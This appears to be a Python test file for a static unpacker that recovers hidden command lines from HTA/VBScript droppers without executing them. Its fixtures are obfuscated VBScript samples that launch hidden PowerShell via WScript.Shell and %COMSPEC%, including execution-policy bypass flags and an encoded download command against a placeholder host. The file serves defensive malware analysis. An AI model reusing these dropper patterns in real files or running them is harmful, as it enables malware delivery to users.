from __future__ import annotations

import base64

from unpackers import hta_constant_command as recovery
from unpackers.hta_constant_command import (
    HtaConstantCommandLimits,
    recover_hta_constant_commands,
)


def _fixture(*, payload: str = "PowerShell -NoProfile -EncodedCommand QQ==") -> bytes:
    return f'''<!DOCTYPE html>
<html><body>
<scrIpT tyPE="text/vbscript">
Dim shellObject, commandValue
Set shellObject = CreateObject(ChrW(&H77) & "script.shell")
commandValue = "{payload}"
shellObject.Run Chr(34) & shellObject.ExpandEnvironmentStrings( _
  Chr(&H25) & Chr(&H63) & ChrW(&H4F) & Chr(&H4D) & _
  ChrW(&H73) & ChrW(&H70) & ChrW(&H65) & ChrW(&H63) & ChrW(&H25) _
) & Chr(34) & Chr(34) & ChrW(&H2F) & ChrW(&H63) & ChrW(&H20) & commandValue & Chr(34), 0
Set shellObject = Nothing
Self.Close
</script>
</body></html>'''.replace(" _\n", " ").encode()


def test_recovers_constant_hta_run_and_powershell_child_without_execution() -> None:
    payload = "PowerShell -NoProfile -EncodedCommand QQ=="
    report, artifacts = recover_hta_constant_commands(_fixture(payload=payload))

    assert report["status"] == "artifacts_recovered"
    assert report["candidate_set_complete"] is True
    assert report["candidate_count"] == 1
    candidate = report["candidates"][0]
    assert candidate["chr_term_count"] == 16
    assert candidate["environment_term_count"] == 1
    assert candidate["window_style"] == 0
    assert candidate["powershell_child_count"] == 1
    assert candidate["shell_released"] is True
    assert candidate["window_closed"] is True
    assert artifacts == [
        (
            "hta-constant-wscript-shell-run-command.cmd",
            f'"%COMSPEC%""/c {payload}"'.encode(),
        ),
        ("hta-constant-powershell-command.cmd", payload.encode()),
    ]
    serialized = repr(report)
    assert payload not in serialized
    assert "QQ==" not in serialized
    assert report["safety"] == {
        "sample_executed": False,
        "network_contacted": False,
        "html_rendered": False,
        "general_vbscript_interpreter_used": False,
        "eval_execute_invoked": False,
        "com_created": False,
        "command_started": False,
        "powershell_started": False,
        "raw_source_included": False,
        "raw_command_included": False,
    }


def test_plus_concatenation_and_wait_argument_are_bounded_constants() -> None:
    data = b"""<html><script language="VBScript">
Dim s, p
Set s = CreateObject("WScript" + ".Shell")
p = "pwsh -NoProfile -c 1"
s.Run "%COMSPEC%" + " /c " + p, 1, False
</script></html>"""
    report, artifacts = recover_hta_constant_commands(data)

    assert report["status"] == "artifacts_recovered"
    assert report["candidates"][0]["wait_argument_present"] is True
    assert report["candidates"][0]["wait"] is False
    assert artifacts[-1] == (
        "hta-constant-powershell-command.cmd",
        b"pwsh -NoProfile -c 1",
    )


def test_powershell_encoded_command_is_decoded_as_utf16le_script() -> None:
    script = (
        "$dst=$env:TEMP; Invoke-WebRequest 'https://example.invalid/a' -OutFile $dst"
    )
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    report, artifacts = recover_hta_constant_commands(
        _fixture(payload=f"poWErsHEll -EX ByPass -NoP -w 1 -eC {encoded}")
    )

    candidate = report["candidates"][0]
    assert candidate["powershell_encoded_script_count"] == 1
    assert candidate["powershell_encoded_script_size"] == [len(script.encode())]
    assert artifacts[-1] == (
        "hta-powershell-encoded-command.ps1",
        script.encode(),
    )


def test_encoded_command_wrong_encoding_or_non_script_is_not_emitted() -> None:
    malformed = base64.b64encode(b"Invoke-WebRequest").decode()
    unrelated = base64.b64encode("ordinary sentence".encode("utf-16-le")).decode()
    for encoded in (malformed, unrelated):
        report, artifacts = recover_hta_constant_commands(
            _fixture(payload=f"powershell -ec {encoded}")
        )
        assert report["candidates"][0]["powershell_encoded_script_count"] == 0
        assert all(
            name != "hta-powershell-encoded-command.ps1" for name, _ in artifacts
        )


def test_explicit_javascript_block_is_not_routed_to_vbscript_profile() -> None:
    data = b"""<!doctype html><html><script type="text/javascript">
var command = "powershell -NoProfile";
</script></html>"""
    report, artifacts = recover_hta_constant_commands(data)

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["applicability"]["strict_profile_lexical_signal"] is False
    assert artifacts == []


def test_non_vbscript_unquoted_attributes_do_not_create_false_partial() -> None:
    report, artifacts = recover_hta_constant_commands(
        b"<html><script type=text/javascript>var x = 1;</script></html>"
    )

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["rejections"] == {}
    assert artifacts == []


def test_dynamic_or_ambiguous_dataflow_fails_closed() -> None:
    variants = (
        _fixture().replace(b"Chr(&H25)", b"Chr(dynamicValue)", 1),
        _fixture().replace(
            b'commandValue = "PowerShell -NoProfile -EncodedCommand QQ=="',
            b'commandValue = "PowerShell -NoProfile"\ncommandValue = "pwsh -c 1"',
        ),
        _fixture().replace(b"Self.Close", b"Execute commandValue"),
        _fixture().replace(b"ChrW(&H25)", b"ChrW(&H10000)", 1),
    )
    for data in variants:
        report, artifacts = recover_hta_constant_commands(data)
        assert report["status"] == "pattern_not_found"
        assert report["candidate_set_complete"] is False
        assert report["rejections"]
        assert artifacts == []


def test_environment_expansion_is_limited_to_comspec_on_same_receiver() -> None:
    unsupported_variable = _fixture().replace(b"Chr(&H63)", b"Chr(&H74)", 1)
    wrong_receiver = _fixture().replace(
        b"shellObject.ExpandEnvironmentStrings",
        b"otherObject.ExpandEnvironmentStrings",
    )
    for data in (unsupported_variable, wrong_receiver):
        report, artifacts = recover_hta_constant_commands(data)
        assert report["candidate_set_complete"] is False
        assert report["candidate_count"] == 0
        assert artifacts == []


def test_input_and_work_limits_fail_closed() -> None:
    input_limited, artifacts = recover_hta_constant_commands(
        _fixture(),
        limits=HtaConstantCommandLimits(max_input_bytes=64),
    )
    assert input_limited["status"] == "input_limit_exceeded"
    assert artifacts == []


def test_large_known_javascript_is_not_reported_as_hta_limit_failure() -> None:
    report, artifacts = recover_hta_constant_commands(
        b"function x(){return 1;}" + b"A" * (2 * 1024 * 1024),
        source_name="delivery.js",
    )

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["applicability"]["known_non_hta_suffix"] is True
    assert artifacts == []


def test_large_unknown_utf16_mixed_case_hta_signal_is_not_silently_skipped() -> None:
    source = (
        '<HtMl><ScRiPt type="text/VbScRiPt">Dim x</ScRiPt></HtMl>'.encode("utf-16-le")
        + b"\x20\x00" * 100
    )
    report, artifacts = recover_hta_constant_commands(
        source,
        limits=HtaConstantCommandLimits(max_input_bytes=64),
        source_name="recovered-layer",
    )

    assert report["status"] == "input_limit_exceeded"
    assert report["candidate_set_complete"] is False
    assert report["applicability"]["strict_profile_lexical_encoding"] == "utf-16-le"
    assert artifacts == []

    work_limited, artifacts = recover_hta_constant_commands(
        _fixture(),
        limits=HtaConstantCommandLimits(max_work_units=32),
    )
    assert work_limited["status"] == "limit_exceeded"
    assert work_limited["limit"] == "max_work_units"
    assert artifacts == []


def test_unbalanced_script_tag_and_duplicate_attribute_fail_closed() -> None:
    for data in (
        b'<html><script type="text/vbscript">Dim x</html>',
        _fixture().replace(
            b'tyPE="text/vbscript"',
            b'tyPE="text/vbscript" type="text/vbscript"',
        ),
    ):
        report, artifacts = recover_hta_constant_commands(data)
        assert report["candidate_set_complete"] is False
        assert artifacts == []


def test_multiple_distinct_run_commands_are_not_implicitly_merged() -> None:
    first = _fixture(payload="powershell -c 1").decode()
    second_body = _fixture(payload="powershell -c 2").decode()
    second = second_body[
        second_body.casefold().index("<script") : second_body.casefold().index(
            "</script>"
        )
        + len("</script>")
    ]
    report, artifacts = recover_hta_constant_commands(
        first.replace("</body>", second + "</body>").encode()
    )

    assert report["status"] == "profile_rejected"
    assert report["candidate_count"] == 2
    assert report["candidate_set_complete"] is False
    assert report["rejections"] == {"ambiguous_distinct_run_commands": 1}
    assert artifacts == []


def test_non_bytes_are_rejected() -> None:
    try:
        recover_hta_constant_commands("not bytes")  # type: ignore[arg-type]
    except TypeError as exc:
        assert "bytes" in str(exc)
    else:
        raise AssertionError("bytes以外を受理しました")


def test_private_integer_parser_rejects_unbounded_or_malformed_values() -> None:
    assert recovery._parse_integer("&H63") == 0x63
    assert recovery._parse_integer("-10") == -10
    assert recovery._parse_integer("&H") is None
    assert recovery._parse_integer("1+2") is None
